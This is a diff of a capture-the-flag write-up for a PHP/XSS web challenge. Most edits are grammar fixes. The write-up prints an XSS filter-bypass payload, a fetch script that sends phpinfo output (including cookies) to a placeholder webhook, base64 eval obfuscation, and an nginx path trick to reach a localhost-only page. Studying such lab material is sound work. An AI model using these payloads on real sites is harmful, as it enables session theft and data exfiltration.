@@ -2,10 +2,10 @@
 title = 'Hello'
 tags = [
   "Web",
-  "Php",
-  "Xss",
-  "140 points",
-  "141 solves",
+  "php",
+  "XSS",
+  "133 points",
+  "165 solves",
   "Abdelhameed Ghazy",
 ]
 date = 2024-08-18T12:58:59+02:00
@@ -109,29 +109,29 @@ As you can see, there are 3 main files to focus on
 
 ## Solution
 
-This challange is very nice in my opinion neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way...
+This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way...
 
-The first one is designed to catch the cookie because in the configuration of bot.js we see that the cookie is set to httpOnly which makes the extraction much more difficult but looking a little online we understand why it is present that info.php in fact the function phpinfo() as well as show several parameters of the php configuration and other information also shows the cookies present at that time ... SO HERE'S THE TARGET AND GET THE OWN BOT TO OPEN /info.php
+The first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time... SO THAT'S THE OBJECTIVE, to get your own bot to open /info.php.
 
 But how can we do this?
 
-The first step is to be able to inject a payload that opens info.php and sends the file somewhere
+The first step is to be able to inject a payload that opens info.php and sends the file somewhere.
 
-The only entrypoint we see is `?name=` which is not sanitized in the best way, in fact by making `<h1>BTC` (we make sure that the tag closes itself otherwise the final / will filter out) we notice that the h1 is rendered and this is ' a first sign that we can do an xss even if we note that the classic `<script>alert('ByteTheCookies')` doesn't work, probably some php configuration or some police, so the xss would be slightly more complex but we can exploit the onerror parameter of img with some changes in fact if we insert a classic `<img src='invalid.jpg' onerror="alert('ByteTheCookies')"` It will be sanitized by removing the spaces and will not allow the xss to be executed. But we can bypass this very easily, in fact by looking for some bypasses on HackTricks and trying some of them we notice that the payload `<img%0Csrc="invalid.jpg"onerror="alert('ByteTheCookies')"` works
+The only entry point we see is `? name='`, which is not sanitised in the best way, in fact by doing `<h1>BTC` (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic `<script>alert('ByteTheCookies')` doesn't work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the `onerror` parameter of tag img with some modifications, in fact, if we insert a classic `<img src='invalid. jpg' onerror="alert('ByteTheCookies')"`, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload `<img%0Csrc="invalid.jpg"onerror="alert('ByteTheCookies')"` works.
 
 GOOD we managed to bypass the xss now we have to create the payload we need...
 
-In particular I used: `fetch('{target}').then(r=>r.text()).then(t=>{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});`
+Specifically, I used: `fetch('{target}').then(r=>r.text()).then(t=>{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});`
 
-This payload makes a first request and sends the content to a webhook in the form of a file so it's all very simple
+This payload makes an initial request and sends the content to a webhook in the form of a file, so it's all very simple.
 
-However, the problem arises in fact if this payload is sent it will not work because the URLs contain / which will be removed and this is a significant problem
+However, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.
 
-To bypass this, however, we can use a very simple trick, We just need to previously encode the payload in base64 and use an `eval(atob(payload))`
+However, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an `eval(atob(payload))`.
 
-By sending this in the url we can make the payload work without problems. FINISHED RIGHT?
+By sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?
 
-No, because analyzing the nginx configuration we notice a significant detail
+No, because analysing the nginx configuration we notice an important detail
 
 ```ngix
 location = /info.php {
@@ -140,11 +140,11 @@ location = /info.php {
         }
 ```
 
-As we see /info.php can only be reached from localhost and spoiler our bot is not on the same server as the challenge
+As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.
 
-This may seem like a major obstacle but in reality by searching the internet for ngix bypasses we can find something very [interesting](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)
+This may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very [interesting](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm).
 
-As we see on hacktricks we notice that if we insert an accessible page immediately after a non-accessible page in the ngix url it redirects us correctly to the non-accessible page and this is exactly what we need
+As we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.
 
 So the final solution becomes:
 
